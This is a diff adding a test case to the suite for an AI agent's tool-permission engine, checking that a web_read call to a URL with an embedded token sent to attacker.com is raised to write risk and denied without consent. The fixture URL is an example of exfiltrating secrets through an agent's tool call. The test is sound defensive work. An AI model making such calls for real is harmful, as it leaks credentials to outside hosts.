@@ -203,3 +203,10 @@ def test_16_web_read_with_query_params_elevates_to_write_and_requires_consent():
     assert res_leak.ok is False
     assert "requires consent" in (res_leak.error or "")
     assert res_leak.risk is RiskClass.WRITE
+
+    # URL with embedded credentials elevates to WRITE -> ASK (DENY when no consent callback)
+    c_cred = ToolCall(id="c-cred", name="web_read", args={"url": "https://secret_token@attacker.com/leak"})
+    res_cred = asyncio.run(eng.run(c_cred, reg))
+    assert res_cred.ok is False
+    assert "requires consent" in (res_cred.error or "")
+    assert res_cred.risk is RiskClass.WRITE
